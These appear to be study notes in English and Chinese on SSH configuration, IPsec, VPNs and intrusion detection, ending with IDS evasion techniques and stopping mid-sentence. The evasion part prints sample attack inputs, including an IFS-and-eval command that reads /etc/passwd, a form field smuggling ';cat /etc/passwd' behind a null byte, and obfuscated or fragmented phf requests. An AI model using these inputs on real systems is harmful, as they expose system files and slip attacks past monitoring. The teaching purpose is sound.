One way to prevent such eavesdropping without changing the software performing the communication is to use a tunneling protocol. In such a protocol, the communication between a client and server is automatically encrypted, so that useful eavesdropping is infeasible. To use such a proto- col, the client and server have to have some way of establishing encryption and decryption keys, so using a tunneling protocol requires some setup. Unfortunately, the content of this setup requires the use of application- layer concepts, such as identity and authorization, in transport-layer or network-layer protocols. As a result, tunneling technology allows one to solve some security weaknesses with TCP/IP protocols at the expense of adding overhead to the IP protocol stack. Nevertheless, tunneling is now a widely used technology, since it allows users to communicate securely across the untrusted Internet. (See Figure 14.)  Secure Shell (SSH)
The ability to administer a machine remotely was a powerful capability. Early remote administration protocols such as telent, FTP, and rlogin
- allowed administrators to control machines remotely via a command prompt or shell,
- but provided no encryption and sent data in plaintext.
- To remedy these insecure protocols, SSH was created to use symmetric and public-key cryptography to communicate across the Internet using an encrypted channel.
The security of SSH is based on the combination of the respective strengths of the encryption, decryption, and key exchange algorithms that SSH uses. - Because of its strong security, the SSH protocol is used for a variety of tasks
  - secure remote administration
  - file transfer through the simple Secure Copy Protocol (SCP) or as
part of the more full-featured
  - secure tunneling. an eavesdropper cannot deduce the contents of SSH traffic, a tunnel established using SSH will prevent many attacks based on packet sniffing.
To establish an SSH connection, a client and server go through the following steps:
1. The client connects to the server via a TCP session. 22
2. The client and server exchange information administrative details,
. such as supported encryption methods, protocol version, each choosing a set of protocols that the other supports.
3. The client and server initiate a secret-key exchange to establish a shared secret session key, encrypt their communication (but not for authentication).
. This session key is used in conjunction with a chosen block cipher (typically AES, 3DES, Blowfish, or IDEA) to encrypt all further communications.
4. The server sends the client a list of acceptable forms of authentication, which the client will try in sequence.
. The most common mechanism is to use a password or the following public-key authentication method:
. If public-key authentication is the selected mechanism, . (a) the client sends the server's public key.
. (b) The server then checks this key is stored in its list of authorized keys. If so, the server encrypts a challenge using the client’s public key and sends it to the client.
. (c) The client decrypts the challenge with its private key and responds to the server, proving its identity.
5. Once authentication has been successfully completed, the server lets the client access appropriate resources, such as a command prompt.
TCP session. 22: 默认配置。 我们可以在配置文件中更改或设置SSH的自定 义端口号。
禁用SSH服务器上的root登录。 在配置文件中实现。在配置文件中将参数“PermitRootLogin”更改为“no”，禁 用直接root登录。
SSH还是Telnet?为什么?
 /etc/ssh/sshd_config or /etc/ssh/ssh_config
service sshd restart
 两个网络协议。 用于通过网络连接和通信到另一台机器。 SSH使用端口 22，Telnet使用端口23。 Telnet以纯文本和非加密格式发送数据，每个人都可以理解，而SSH以加密 格式发送数据。
SSH比Telnet更安全。
 无密码登录SSH服务器?  使用ssh-keygen技术来创建公钥和私钥。
$ ssh-keygen
$ ssh-copy-id -i /home/USER/.ssh/id_rsa.pub REMOTE-SERVER.  //
  制到远程主机。 允许用户和组访问SSH服务器?
将公钥复
编辑SSH服务的配置文件。在底部添加用户和组，然后重新启动服务。
用户登录SSH服务器，添加欢迎/警告消息? 添加自定义消息
跟踪到侵入日期的对SSH服务器的未经授权的登录尝试及其相应的 IP。
通过SSH复制文件?怎么样?
从本地文件传递输入到SSH
 AllowUsers Howtoing Howtoing1 Howtoing2
AllowGroups group_1 group_2 group_3
 尽快用户登录到SSH服务器添加一个值得欢迎的/警告信息，编辑文件名为 “的/ etc /问题”，并添加消息出现。
 # nano /etc/issue
 在位置'/var/log/secure'处创建的日志文件中找到失败的登录尝试。
 # cat /var/log/secure | grep “Failed password for”
 SCP使用SSH复制文件，
 $ scp text_file_to_be_copied Your_username@Remote_Host_server:/Path/To/
Remote/Directory # ssh username@servername < local_file.txt
#    $OpenBSD: sshd_config,v 1.103 2018/04/09 20:41:22 tj Exp $
#Port 22
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::
#HostKey /etc/ssh/ssh_host_rsa_key
#HostKey /etc/ssh/ssh_host_ecdsa_key
#HostKey /etc/ssh/ssh_host_ed25519_key
# Ciphers and keying
#RekeyLimit default none
# Logging
#SyslogFacility AUTH
#LogLevel INFO
# Authentication:
#LoginGraceTime 2m
#PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10
#PubkeyAuthentication yes
# The default is to check both .ssh/authorized_keys and .ssh/
authorized_keys2
# but this is overridden so installations will only check .ssh/
authorized_keys
AuthorizedKeysFile  .ssh/authorized_keys
#AuthorizedPrincipalsFile none
#AuthorizedKeysCommand none
#AuthorizedKeysCommandUser nobody
# For this to work you will also need host keys in /etc/ssh/
ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes
# To disable tunneled clear text passwords, change to no here!
 #PasswordAuthentication yes
#PermitEmptyPasswords no
# Change to no to disable s/key passwords
#ChallengeResponseAuthentication yes
# Kerberos options
#KerberosAuthentication no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes
#KerberosGetAFSToken no
# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes
# Set this to 'yes' to enable PAM authentication, account
processing,
# and session processing. If this is enabled, PAM authentication
will
# be allowed through the ChallengeResponseAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via ChallengeResponseAuthentication may
bypass
# the setting of "PermitRootLogin without-password".
# If you just want the PAM account and session checks to run
without
# PAM authentication, then enable this but set
PasswordAuthentication
# and ChallengeResponseAuthentication to 'no'.
UsePAM yes
#AllowAgentForwarding yes
#AllowTcpForwarding yes
#GatewayPorts no
#X11Forwarding no
#X11DisplayOffset 10
#X11UseLocalhost yes
#PermitTTY yes
#PrintMotd yes
#PrintLastLog yes
#TCPKeepAlive yes
#PermitUserEnvironment no
#Compression delayed
#ClientAliveInterval 0
#ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
#PermitTunnel no
#ChrootDirectory none
#VersionAddendum none # pass locale information
AcceptEnv LANG LC_*
# no default banner path
#Banner none
# override default of no subsystems
Subsystem sftp /usr/libexec/sftp-server
# Example of overriding settings on a per-user basis
#Match User anoncvs
#    X11Forwarding no
#    AllowTcpForwarding no
#    PermitTTY no
#    ForceCommand cvs server
A security administrator needs to address the following audit recommendations for a public-facing SFTP server:
Users should be restricted to upload and download files to their own home directories only.
Users should not be allowed to use interactive shell login. configuration parameters should be implemented
ChrootDirectory PermitTTY
3.2 IPsec
One of the fundamental shortcomings of the Internet Protocol is a lack of built- in security measures to ensure the authenticity and privacy of each IP packet.
IP itself has no mechanism for ensuring a particular packet comes from a trusted source, since IP packets merely contain a “source address” field that can be spoofed by anyone. In addition, there is no attempt to encrypt data contained in IP packets to guarantee data privacy. Finally, while the IP header contains a noncryptographic checksum for verifying the integrity of the header, there is no attempt to do the same for the payload. The questions of authentication and privacy are addressed in several upper-layer protocols, such as DNSSEC (Section 1.4), SSH (Sec- tion 3.1), and SSL/TLS, but a more powerful solution at the network layer would guarantee security for all applications. To solve these problems, a pro- tocol suite known as Internet Protocol Security (IPsec) was created. IPsec was created in conjunction with IPv6, but was designed to be backwards- compatible for use with IPv4. Because it operates at the network layer, IPsec is completely transparent to applications. Implementing IPsec requires a modified IP stack, but no changes to network applications are necessary.
IPsec consists of several protocols, each addressing different security needs. Each protocol can operate in one of two modes, transport mode or tunnel mode. ▪


##  transport mode, additional IPsec header information is inserted before the data of the original packet, and only the payload of the packet is encrypted or authenticated.
tunnel mode, a new packet is constructed with IPsec header information, and the entire original packet, including its header, is encapsulated as the payload of the new packet.
Tunnel mode is commonly used to create virtual private networks (VPNs), which are discussed in Section 3.3.
In order to use IPsec extensions, the two parties communicating must first set up a set of security associations (SAs), pieces of information that describe how secure communications are to be conducted between the two parties. SAs contain encryption keys, information on which algorithms are to be used, and other parameters related to communication. SAs are uni- directional, so each party must create an SA for inbound and outbound traffic. Communicating parties store SAs in a security association database (SADB). IPsec provides protection for outgoing packets and verifies or decrypts incoming packets by using a security parameter index (SPI) field stored in the IPsec packet header, along with the destination or source IP address, to index into the SADB and perform actions based on the appropriate SA.
Internet Key Exchange (IKE)
IPsec uses the Internet Key Exchange (IKE) protocol to handle the negotia- tion of SAs. IKE operates in two stages: first, an initial security association is established to encrypt subsequent IKE communications, and second, this encrypted channel is used to define the SAs for the actual IPsec traffic. To establish the initial SA, a secure-key exchange algorithm is used to establish a shared secret key between the two parties. Once this encrypted channel is established, the parties exchange information to define their SAs, including an encryption algorithm, a hash algorithm, and an authentication method such as preshared keys. Once these SAs have been created, the two parties can communicate using IPsec protocols to provide confidentiality, authentication,
 ▪


## and data integrity.
The Authentication Header (AH)
used to authenticate the origin and guarantee the data integrity of IPsec
packets.
The AH, is added to an IPsec packet before the payload
either contains the original IP payload or the entire encapsulated IP packet
  - depending on whether the transport or tunnel mode is used.
   ▪


## Components of the Authentication Header
The AH header contains a security parameter index (SPI) used to identify the security association associated with the packet, a randomly initialized sequence number to prevent replay attacks, and an “authentication data” field that contains an integrity check value (ICV). The ICV is computed by hashing the entire packet, including the IPsec header, with the exception of fields that may change during routing and the authentication data itself. The hash is computed by using a message authentication code (MAC), an algorithm that acts as a cryptographic hash function but also makes use of a secret key. The recommended hash function for this MAC is SHA-256. If a malicious party were to tamper with the packet, then the receiving party would discover the discrepancy by recomputing the ICV. In addition, since a secret key is used, only an authenticated party could properly encrypt the payload, verifying the packet’s origin. AH’s strong authentication comes at a cost. It does not work in conjunction with Network Address Translation (NAT), because its IP source address is included among its authenticated data. Therefore, a NAT device could not successfully rewrite the source IP address while maintaining the ICV of the packet.
The Encapsulating Security Payload (ESP)
AH provides integrity and origin authentication, it does nothing to
guarantee confidentiality—packets are still unencrypted.
To satisfy this additional security requirement, the encapsulating security payload (ESP) header, can be used.
While AH places a header before the payload or original packet, ESP encapsulates its payload by providing a header and a “trailer.”
To provide encryption, ESP uses a specified block cipher (typically AES, 3DES, or Blowfish) to encrypt either the entire original IP packet or just
   ▪


## its data, depending on whether the tunnel or transport mode is used.
ESP also provides optional authentication in the form of an “authentication data” field in the ESP trailer. Unlike AH, ESP
authenticates the ESP header and payload, but not the IP header. This provides slightly weaker security in that it does not protect the IP header from tampering, but allows NAT devices to successfully rewrite source IP addresses. However, note that encryption of the payload poses another problem for NAT. Since TCP port numbers are no longer visible to NAT devices, some other identifier must be used to maintain the NAT lookup table.
 3.3 Virtual Private Networking (VPN)
Virtual private networking (VPN) is a technology
allows private networks to be safely extended over long physical distances by making use of a public network, such as the Internet, as a means of transport.
VPN provides guarantees of data confidentiality, integrity, and authentication, despite the use of an untrusted network for transmission.
There are two primary types of VPNs, remote access VPN and site-to-site VPN.
Remote access VPNs
allow authorized clients to access a private network be referred as an
intranet.
example: an organization may wish to allow employees access to the company network remotely but make it appear as though they are local to their system and even the Internet itself. To accomplish this, the organization sets up a VPN endpoint, known as a network access server, or NAS. Clients typically install VPN client software on their machines, which handle negotiating a connection to the NAS and facilitating communication.
Site-to-site VPN solutions
designed to provide a secure bridge between two or more physically distant
networks.
Before VPN, organizations wishing to safely bridge their private networks purchased expensive leased lines to directly connect their intranets with cabling. VPN provides the same security but uses the Internet for communication rather than relying on a private physical layer. To create a site-to-site VPN connection, both networks have a separate VPN endpoint, each of which communicates with the other and transmits traffic appropriately.
VPN itself is not standardized, and many companies provide competing VPN solutions. However, most VPN implementations make use of a limited set of protocols to securely transfer data. The details of each of these protocols is beyond the scope of this book, but nearly all use tunneling and encapsulation techniques to protect network traffic. example, one of the most widely deployed implementations uses the point-to-point tunneling protocol (PPTP). PPTP works by establishing a connection using the peer- to-peer (PPP) link- layer protocol, then encapsulating PPP frames, which are encrypted using Microsoft Point-to-Point Encryption (MPPE), inside IP packets that can be sent across the Internet. A newer protocol, the Layer 2 Tunneling Protocol (L2TP), was designed to replace PPTP and another older tunneling protocol, Cisco’s Layer 2 Forwarding (L2F). The entire L2TP frame, including both header and payload, is encapsulated within a UDP datagram. Within the L2TP packet, a number of link-layer protocols can be encapsulated, including PPP and Ethernet. L2TP is commonly used in con- junction with IPsec to ensure authentication, integrity, and confidentiality.
Some Risks in Allowing for VPNs and Tunneling
While VPNs and other secure tunneling technologies solve one security problem (i.e., how to communicate securely across the Internet), they ac- tually can create another. In particular, one of the most common methods to circumvent firewall policy relies on the use of tunneling. When using a tunneling protocol, the payloads of a series of network packets are en- capsulated in a different delivery protocol that might otherwise be blocked by a firewall. Deep packet inspection is useless in this case (other than to detect that a tunnel protocol is being used), since the payloads in a tunnel protocol are encrypted. For instance, an information-leakage attack, such as sending company secrets out of a compromised network using HTTP packets, becomes more difficult to detect when protocols relying on tunneling are used. Because tunnel protocols are designed such that an eavesdropper cannot deduce the contents of the encrypted traffic, no amount of deep packet inspection can determine whether the tunneling is being used for a legitimate purpose or whether it is being used as a wrapper for a forbidden protocol. As another example of using tunneling to subvert firewall rules, suppose an organization prevents users from visiting certain web sites from within the internal network. If outbound tunnel connections are allowed, then an internal user could establish a tunnel to an external server that routes HTTP traffic to a forbidden web site on behalf of that user, and sends responses back to the user via the same tunnel. Attackers can also use tunneling to circumvent firewall policy for more malicious purposes. Therefore, it is essential that care be taken when defining acceptable traffic policies for users, especially in regards to protocols that could potentially be used for tunneling. New S+ ch4. Advanced Security Devices
IDSs and IPSs
Intrusion detection systems (IDSs):
passive and not in-band.
monitor a network and send alerts when they detect suspicious events on a system or network.
Intrusion prevention systems (IPSs):
in-band.
react to attacks in progress, prevent them from reaching systems and networks. IDSs and IPSs have same capability:
  - capture the traffic, analyze it to detect potential attacks or anomalies using similar detection methods.
  - inspect traffic using the same functionality as a protocol analyzer.
  - IDSs and IPSs can also protect internal private networks, such as
private supervisory control and data acquisition (SCADA) networks. Biggest difference: responses to an attack.
Detection Methods
IDS can only detect an attack, cannot prevent attacks.
IPS prevents attacks by detecting them and stopping them before they reach the target. The two primary methods of detection:
  - Signature / definition based
  - Heuristic / behavioral / anomaly based.
Any type of IDS can detect attacks based on signatures, anomalies, or both. The HIDS monitors the network traffic reaching its NIC and the NIDS monitors the traffic on the network.
Signature-Based Detection
- use a database of known vulnerabilities or known attack patterns.
- signature-based IDS or IPS uses signatures to detect known attacks or
vulnerabilities. Example:
tools are available for an attacker to launch a SYN flood attack on a server by simply entering the IP address of the system to attack.
The attack tool then floods the target system with synchronize (SYN) packets, but never completes the three-way Transmission Control Protocol (TCP) handshake with the final acknowledge (ACK) packet.
it consume resources on a system and ultimately cause it tocrash.
However, this is a known attack with a specific pattern of successive SYN packets from one IP to another IP.
The IDS can detect these patterns when the signature database includes the attack definitions.
The process is very similar to what antivirus software uses to detect malware. need to update IDS signatures and antivirus definitions from vendor regular.
启发式 Heuristic/Behavioral Detection
- identifying normal operation / behavior of the network.
- creating a performance baseline under normal operating conditions.
- detect attacks based on anomalies or when traffic is outside expected
boundaries.
- uses algorithms to analyze the traffic passing through the network? The IDS provides continuous monitoring by constantly comparing current network behavior against the baseline.
- When the IDS detects abnormal activity (outside normal boundaries as identified in the baseline), it gives an alert indicating a potential attack.
- examine activity and detect abnormal activity is beyond the capability of signature-based detection.
SYN Flood Attack
The SYN flood attack is a common denial-of-service (DoS) attack.
the attacker sends multiple SYN packets but never completes the third part of the TCP handshake with the last ACKpacket, the server keeps answering every SYN packet with a SYN/ACK packet.
Each uncompleted session consumes resources on the server, SYN flood attack can crash the server.
  - Some servers reserve a certain number of resources for connections, and once the attack consumes these resources, the system blocks additional connections.
the attack prevents legitimate users from connecting to the server.
IDSs and IPSs can detect a SYN flood attack and IPSs can prevent the attack.
many firewalls have SYN flood guard to detect SYN flood attacks and take steps to close the open sessions
different than a flood guard on a switch to stop MAC flood attacks. This can be effective at discovering zero-day exploits.
zero-day vulnerability: unknown to the vendor or know but has not written, tested, and released a patch to close the vulnerability yet.
both cases, the vulnerability exists and systems are unprotected.
If attackers discover the vulnerabilities, they try to exploit them.
However,the attack has the potential to create abnormal traffic allowing an anomaly- based system to detect it.
Any time administrators make any significant changes to a system or network that
cause the normal behavior to change, they should re-create the baseline. the IDS will constantly alert on what is now normal behavior.
Data Sources and Trends
Any type of IDS will use various raw data sources to collect information on activity. This includes a wide variety of logs, such as firewall logs, system logs, and
application logs.
These logs can be analyzed to provide insight on trends.
These trends can detect a pattern of attacks and provide insight into how to better protect a network.
Many IDSs have the capability to monitor logs in real time.
Each time a system records a log entry, the IDS examines the log to determine if
it is an item of interest or not.
Other IDSs will periodically poll relevant logs and scan new entries looking for items of interest.
Reporting Based on Rules
IDSs report on events of interest based on rules configured within the IDS.
All events aren’t attacks or actual issues, but instead, they provide a report indicating an event might be an alert or an alarm. Administrators investigate to determine if it is valid.
Some systems consider an alarm and an alert as the same thing.
Other systems use an alarm for a potentially serious issue
an alert as a relatively minor issue.
The goal in these latter systems is to encourage administrators to give a higher precedence to alarms than alerts.
The actual reporting mechanism varies from system to system and in different organizations.
Example:
one IDS might write the event into a log as an alarm or alert, and then send an email to an administrator account.
In a large network operations center (NOC), the IDS might send an alert to a monitor easily viewable by all personnel in the NOC.
The point is that administrators configure the rules within the IDS based on the needs of the organization.
False Positives vs False Negatives
IDSs use advanced analytics to examine traffic, are susceptible to both false positives and false negatives.
false positive:
  - an alert or alarm on an event that is nonthreatening, benign, or harmless.
  - increase the workload of administrators.
false negative: is when an attacker is actively attacking the network, but the
system does not detect it.
Neither is desirable, but it’s impossible to eliminate both. Most IDSs trigger an
alert or alarm when an event exceeds a threshold. Consider the classic SYN flood attack
the attacking host never sends the ACK, but continues to send more SYN packets. This leaves the server with open connections that can ultimately disrupt services.
If a system receives 1 SYN packet without the accompanying ACK packet, is it an attack? Probably not. This can happen during normal operations.
If a system receives over 1,000 SYN packets from a single IP address in less than 60 seconds, without the accompanying ACK packet, is it an attack? Absolutely.
Administrators configure rules within the IDS and set the threshold to a number between 1 and 1,000 to indicate an attack. ▪


## If administrators set it too low, too many false positives, high workload as they spend their time chasing ghosts.
If they set the threshold too high, actual attacks will get through without administrators knowing about them.
configure settings based on the analytics and capabilities of the IDS.
Most administrators want to know if their system is under attack. That’s the primary
purpose of the IDS.
IDS that constantly cries “Wolf!” will be ignored when the real wolf attacks.
It’s important to set the threshold high enough to reduce the number of false positives, but low enough to alert on any actual attacks.
Intrusion detection system (IDS)
software / hardware system
detect signs of malicious activity on network or individual computer.
The functions of an IDS
  - IDS sensors: collect real-time data about the functioning of network components and computers
  - IDS manager: receives reports from sensors.
  - compiles data from the IDS sensors to determine if an
intrusion has occurred.
  - This determination is usually based on a set of site policies, sets of rules and statistical conditions that define probable intrusions.
  - If an IDS manager detects an intrusion, it sounds an alarm so that system administrators can react to a possible attack.
   ▪


##  Network & Host IDS/IPS
NIDS – Network Intrusion Detection System
Using a network tap, span port, or hub collects packets on the network
Attempts to identify unauthorized, illicit, and anomalous behavior
based on network traffic
Methods:
  - signature file comparisons,
  - anomaly detection,
   ▪


##   - stateful protocol analysis
Using the captured data, the IDS system processes and flags any
suspicious traffic
HIDS – Host Intrusion Detection System
Generally involves an agent installed on each system, monitoring and alerting on local OS and application activity
Attempts to identify unauthorized, illicit, and anomalous behavior on a specific device/OS
The installed agent uses a combination of signatures, rules, and heuristics to identify unauthorized activity
IDS vs IPS?
An IDS only has passive role (identify, log and alert)
An IPS also blocks network traffic IDS is designed to detect:
threats:
  - Masquerader 化装跳舞者: an attacker who is falsely using the identity/credentials of a legitimate user to gain access to computer system/network.
  - Misfeasor违法行为者: a legitimate user who performs actions he is not authorized to do
  - Clandestine 暗中地 user: a user who tries to block/cover up his actions by deleting audit/system logs.
automated attacks and threats:
  - port scans: information gathering, intended to determine which
       ▪


## ports on a host are open for TCP connections
  - Denial-of-service attacks: network attacks meant to overwhelm a host and shut out legitimate accesses
  - Malware attacks: replicating malicious software attacks, like Trojan horses, computer worms, viruses, etc.
  - ARP spoofing: redirect IP traffic in a local-area network
  - DNS cache poisoning: a pharming attack, changing a host’s DNS
cache to create a falsified domain-name/IP-address association.
IDS Evasion Techniques
- "A look at whisker's anti-IDS tactics" by Rain Forest Puppy (http://www.apachesecurity.net/ archive/whiskerids.html)
- "IDS Evasion Techniques and Tactics" by Kevin Timm (http://www.securityfocus.com/ printable/infocus/1577)
Brief Overview
From CIDF to RFC 4765
  - Common Intrusion Detection Framework (CIDF)
  - An old (late 90s) attempt by DARPA (US govt's
Defense Advanced Research Projects Agency) to
develop an IDS interchange format
  - Started as a research project, currently dormant
  - CIDF components that together define an Intrusion Detection System:
  - E-boxes - event generators (sniffers, monitors)
  - A-boxes - analysis engines (signature matchers)
  - D-boxes - storage mechanisms (loggers)
  - C-boxes - countermeasures (alarms, firewalls)
           ▪


##  ⁃
  - The IETF (Internet Engineering Task Force) more recently (2007) started work on a common format (RFC 4765):
Physical, Network and Host IDS/IPS
  - Physical: - Security Guards - Security Cameras - Access Control Systems (Card, Biometric) - Firewalls - Man Traps - Motion Sensors
NIDS design considerations & problems
Simple Evasion Techniques
Using mixed case characters
This technique can be useful for attackers when attacking
platforms (e.g., Windows) where filenames are not case sensitive; otherwise, it is useless. Its usefulness rises, however, if the target Apache includes mod_speling as one of its modules.
This module tries to find a matching file on disk, ignoring
   ▪


## case and allowing up to one spelling mistake.
Character escaping
you can escape any character by preceding the character
with a backslash character (\), and if the character does not have a special meaning, the escaped character will convert into itself.
Thus, \d converts to d. It is not much but it is enough to fool an IDS.
For example, an IDS looking for the pattern id would not detect a string i\d, which has essentially the same meaning.
Using whitespace
Using excessive whitespace, especially the less frequently
thought of characters such as TAB and new line, can be an evasion technique.
example
SQL injection attempt using DELETE FROM (two spaces in between the words instead of one)
the attack will be undetected by an IDS looking for DELETE FROM (with just one space in between).
Path Obfuscation
Many evasion techniques are used in attacks against the filesystem.
For example, many methods can obfuscate paths to make them
       ▪


## less detectable:
Self-referencing directories
When a ./ combination is used in a path, it does not change the meaning but it breaks the sequence of characters in two.
example, /etc/passwd = obfuscated: /etc/./passwd. Double slashes
Using double slashes is one of the oldest evasion techniques.
example, /etc/passwd may be written as /etc//passwd. Path traversal
Path traversal occurs when a backreference is used to back
out of the current folder, but the name of the folder is used again to advance.
For example, /etc/passwd may be written as /etc/dummy/../ passwd, and both versions are legal.
This evasion technique can be used against application code
that performs a file download to make it disclose an arbitrary file on the filesystem. Another use of the attack is to evade an IDS system looking for well-known patterns in the traffic (/ etc/passwd is one example).
Windows folder separator
When the web server is running on Windows, the Windows- specific folder separator \ can be used.
For example, ../../cmd.exe = ..\..\cmd.exe. IFS evasion
         ▪


##  Internal Field Separator (IFS) is a feature of some UNIX
shells (sh and bash, for example) that allows the user to change the field separator (normally, a whitespace character) to something else.
After you execute an IFS=X command on the shell command line
you can type CMD=X/bin/catX/etc/passwd;eval$CMD to display the contents of the /etc/passwd file on screen.
Null-Byte Attacks
Using URL-encoded null bytes is an evasion technique and an attack at the same time.
This attack is effective against applications developed using
C-based programming languages. Even with scripted applications, the application engine they were developed to work with is likely to be developed in C and possibly vulnerable to this attack. Even Java programs eventually use native file manipulation functions, making them vulnerable, too.
Internally, all C-based programming languages use the null byte for string termination.
  - When a URL-encoded null byte is planted into a request, it often fools the receiving application, which decodes the encoding and plants the null byte into the string. The planted null byte will be treated as the end of the string during the program's operation, and the part of the string that comes after it and before the real
     ▪


## string terminator will practically vanish.
We looked at how a URL-encoded null byte can be used as
an attack when we covered source code disclosure vulnerabilities in the "Source Code Disclosure" section. This vulnerability is rare in practice though Perl programs can be in danger of null-byte attacks, depending on how they are programmed.
Null-byte encoding is used as an evasion technique mainly
against web application firewalls when they are in place. These systems are almost exclusively C-based (they have to be for performance reasons), making the null-byte evasion technique effective.
Web application firewalls trigger an error when a dangerous signature (pattern) is discovered.
  - They may be configured not to forward the request to the web server, the attack attempt will fail.
  - However, if the signature is hidden after an encoded null byte, the firewall may not detect the signature, allowing the request through and making the attack possible.
To see how this is possible, we will look at a
single POST request, representing an attempt to exploit a
vulnerable form-to-email script and retrieve the passwd file:
POST /update.php HTTP/1.0
Host: www.example.com
Content-Type: application/x-form-urlencoded Content-Length: 78
firstname=Ivan&lastname=Ristic%00&email=ivanr@webkreator.c om;cat%20/etc/passwd
   ▪


##  A web application firewall configured to watch for the /etc/ passwd string will normally easily prevent such an attack.
But notice how we have embedded a null byte at the end of the lastname parameter.
If the firewall is vulnerable to this type of evasion, it may
miss our command execution attack, enabling us to continue with compromise attempts.
Some Advanced Evasion Techniques (AETs) Obfuscation
(Insertion, Evasion, Session Splicing, Fragmentation) Insertion: Stuffing the analyzer with “invalid” packets
  - 看到碎成1-character packet秒選 *Insertion Attack*)
  - (1-character packet, 利用TTL-1=0讓部分packet死在IDS
      - ▪


##  Evasion: Slipping “valid” packets past the analyzer
 ⁃
 ▪


##  Fragmentation: Breaking the attack into multiple packets Similar to Session Splicing
  - Attacker send packets in blocks that do not trigger IDS signatures or cause alerts
  - Generally more powerful than Session Splicing Two common fragmentation methods
  - overwrites a section of a previous fragment
  - overwrites a complete fragment
Enables attackers to write an entire packet of garbage
information and craft their attack to blend in with standard protocols
Some IDSs do have ways to handle these attacks through reassembly
examples
Attack 1: Overlap Method
  - Packet 1: GET /cgi-bin/
     - ▪


##   - Packet 2: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../ phxx
  - Packet 3: f?
This fragmentation can overwrite the 'xx' portion of Packet 2
with the data in Packet 3, making the information resemble the following:
  - GET /cgi-bin/ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../ phf?
Attack 2: Overwrite Method
  - Packet 1: GET /cgi-bin/
  - Packet 2: some_normal_filename.cgi
  - Packet 3: /aaa/../aaa/../aaa/../phxx
  - Packet 4: f?
similar to the first
but, the 'xx' portion is overwritten and the
some_normal_filename.cgi packet is completely overwritten with the last two packets
  - This leaves GET /cgi-bin/phf? as the end result.
Session Splicing
attacker delivers data in multiple, smallsized packets to the target computer
  - making it very difficult for an IDS to detect the attack signatures.
  - no single packet triggers the IDS
  - it is effective against IDS that do not reconstruct
     - ▪


## packets before checking them again through intrusion signatures attacker attempts to deliver the payload over multiple
packets over long periods of time
  - If attackers are aware of delays in packet reassembly at the IDS, they can add delays between packet transmissions to bypass the reassembly
  - Many IDS stop reassembly if they do not receive packets within a certain time
  - IDS become useless if the target host keeps sessions active for a longer time than the IDS reassembly time
Any attack attempt after a successful splicing attack will not be logged by the IDS
defeating simple pattern matching in IDS systems without session reconstruction
characteristic of the attack: a continuous stream of small packets.
Tool: Whisker
One basic technique is to split the attack payload into
multiple small packets, so that the IDS must reassemble the packet stream to detect the attack.
way of splitting packets: fragmenting them, but an adversary can also simply craft packets with small payloads.
The 'whisker' evasion tool calls crafting packets with small payloads 'session splicing'.
       ▪


## Denial of Service (DoS) & False Positive Generation Causing resource starvation and overloading the IDS
Basic problem
  - NIDS needs to simulate the operation of all protected end-systems and internal network
  - Scarce Resources (CPU cycles, memory, disk space, bandwidth)
  - Usually working in a “fail-open” state
CPU DoS (target computationally expensive operations)
  - Fragment/Segment reassembly
  - Encryption/Decryption
Memory DoS (target state management operations)
  - TCP 3-way Handshake (TCP Control Block - TCB)
  - Fragment/Segment reassembly
Network Bandwidth DoS (target NIDS’s inability to process packets at line speed)
Reactive Systems DoS
  - Trigger lots of alarms (false positives)
  - Prevent valid access by spoofed addresses
  - Hide real attacks
Pattern-Matching Weaknesses
Exploiting pattern-based detection approach employed by most IDS
Pattern-matching weaknesses
Most IDS solutions employ a pattern-based detection
component
  - This approach is problematic, because not all input
needs to be the same to trigger vulnerabilities
         - ▪


##  Example pattern:
  - GET /cgi-bin/phf?
Obfuscation:
  - GET /cgi-bin/aaaaaaaaaaaaaaaaaaaaaaaaaa/.. %25%2fp%68f?
Both versions result in the same output, yet look very different
Unicode evasion can also be used here
  - e.g. \ can be represented as 5C, C19C and E0819C
extremely common IDS evasion technique in the web world?
unicode characters
Unicode attacks can be effective against applications that understand it.
Unicode: represent every character needed by every written human language as a single integer number.
Unicode evasion, referenced as UTF-8 evasion.
Unicode characters are normally represented with two bytes, but this is impractical in real life.
One aspect of UTF-8 encoding causes problems:
  - non-Unicode characters can be represented encoded.
  - What is worse is multiple representations of each character can exist.
  - Non-Unicode character encodings are known as
       ▪


## overlong characters, and may be signs of attempted attack.
Protocol Violation,
Attacks targeted at complex protocol
  - e.g. SMB (Server Message Block), MSRPC, SunRPC
In order to provide protection to a complex protocol, the IDS has to have a deep understanding of it
The IDS implementation also needs to be
  - Fault-tolerant
  - Resilient
  - Able to cope with excessive and unexpected
connections and requests
TTL Attacks
attackers have some knowledge of the internal network
topology
  - Attackers must know the distance to the end host and
whether an IDS is placed in front of the end host
By using a small TTL flag in a TCP packet, attackers can
send packets that will only reach the IDS and not the end host
  - The IDS, in turn, will think the packet addressed to the end host will make it there
  - This allows attackers to inject garbage packets into the IDS stream processing
      Example:
  - Packet 1: GET /cgi-bin/p
  - Packet 2: some_file.cgi?=
  - Packet 3: hf?
TTL 15 TTL 10 TTL 15
 ▪


## and will receive the data
It also assumes that the IDS is within the 10-14 TTL limit,
and any data lower than that will not reach the destination host
  - The IDS receives: GET /cgi-bin/psome_file.cgi?=hf?
  - The end host will receive: GET /cgi-bin/phf?
Urgency Flag
The urgency flag is used within the TCP protocol to mark
data as urgent
  - When the urgency flag is set, all data before the
urgency pointer is ignored, and the data to which the urgency pointer points is processed
Some IDSs do not take into account the TCP protocol's
urgency feature
  - Attackers can place garbage data before the urgency
pointer
  - The IDS reads that data without consideration for the
end host's urgency flag handling
  - This means the IDS has more data than the end host
actually processed
Example of an urgency flag attack:
  - "1 Byte data, next to Urgent data, will be lost, when Urgent data and normal data are combined."
  - Packet 1: ABC
  - Packet 2: DEF Urgency Pointer: 3
  - Packet 3: GHI
  - End result: ABCDEFHI
According to the 1122 RFC, the urgency pointer causes one
